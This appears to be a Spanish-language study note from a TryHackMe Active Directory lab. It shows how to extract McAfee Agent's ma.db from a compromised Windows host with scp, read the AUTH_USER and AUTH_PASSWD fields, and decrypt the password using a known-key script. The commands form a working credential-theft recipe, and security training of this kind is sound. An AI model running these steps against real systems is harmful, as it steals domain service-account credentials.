---
layout: apunte
title: "7. Configuration Files"
---

EL último tramo de enumeración que exploraremos en esta red serán los archivos de configuración. Supón que tienes suerte y causas una brecha que te da accedo a un host en la red de la organización. En este caso, los archivos de configuración son una forma excelente de explorar en un intento de obtener credenciales AD. Dependiendo del host que fue comprometido, puedes encontrar varios tipos diferentes de archivos de configuración útiles para la enumeración:

- Archivos de configuración de aplicaciones web.
- Archivos de configuración de servicios.
- Claves de registro.
- Aplicaciones desplegadas centralmente.

Varios scripts de enumeración, como [Seatbelt](https://github.com/GhostPack/Seatbelt) pueden ser usados para automatizar este proceso.

-------------------------------
<h2>Credenciales de Archivos de Configuración</h2>
Nos centraremos en recuperar credenciales de una aplicación desplegada centralmente. Normalmente, estas aplicaciones necesitan un método para autentificarse en el dominio durante la instalación y las fases de ejecución. Un ejemplo de esta aplicación es McAfee Enterprise Endpoint Security, la cual las organizaciones pueden usar como herramienta de detección y respuesta para seguridad.

McAfee incrusta credenciales usadas durante la instalación para conectar de vuelta al orquestador en el archivo llamado `ma.db`. Esta base de datos puede ser recuperada y leída con un acceso local al host para recuperar la cuenta de servicio AD asociada. Usaremos SSH para acceder a THMJMP1 de nuevo para este ejercicio.

El archivo `ma.db` está guardado en una localización fijada:

```bash
thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 Volume in drive C is Windows 10
 Volume Serial Number is 6A0F-AA0F

 Directory of C:\ProgramData\McAfee\Agent\DB      

03/05/2022  10:03 AM    <DIR>          .
03/05/2022  10:03 AM    <DIR>          ..
03/05/2022  10:03 AM           120,832 ma.db      
               1 File(s)        120,832 bytes     
               2 Dir(s)  39,426,285,568 bytes free
```

Podemos usar SCP para copiar `ma.db` a nuestra máquina:

```bash
thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@10.200.4.249's password:
ma.db 100%  118KB 144.1KB/s   00:00
```

Para leer la base de datos, usaremos una herramienta llamada `sqlitebrowser`. Podemos abrir la base de datos usando el siguiente comando:

```bash
sqlitebrowser ma.db
```

Usando `sqlitebrowser` seleccionaremos la opción de Browse Data y nos enfocaremos en la tabla `AGENT_REPOSITORIES`:

!**Pasted image 20260717002600.png**

Nos interesa particularmente la segunda entrada enfocada al `DOMAIN`, `AUTH_USER` y `AUTH_PASSWD`. Toma nota de los valores guardadas en estas entradas. Sin embargo, el campo `AUTH_PASSWD` está encriptado. Por suerte, McAfee encripta este campo con una clave conocida. Por lo que usaremos el siguiente [script de Python](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/blob/master/mcafee_sitelist_pwd_decrypt.py) para desencriptarla.

Tendrás que unzipear la lista dada:

```bash
thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
```

Si le damos lo que tenemos que darle en los parámetros obtenemos la contraseña.

```bash
thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
Crypted password   : <AUTH PASSWD VALUE>
Decrypted password : <Decrypted Pasword>
```